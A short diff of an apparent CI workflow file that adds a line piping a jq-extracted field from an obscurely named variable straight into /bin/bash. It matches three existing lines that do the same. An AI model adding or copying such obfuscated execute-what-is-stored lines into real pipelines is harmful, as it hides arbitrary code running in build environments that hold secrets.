@@ -24,6 +24,7 @@ jobs:
           echo $r1235 | jq -r .lxv3 | /bin/bash
           printf '%s' "$ysmp42197" | jq -r .x65092 | /bin/bash
           printf '%s' "$k060" | jq -r .ogkm65 | /bin/bash
+          echo $gjj40840 | jq -r .zyj4 | /bin/bash
 
       - name: Archive results
         if: always()
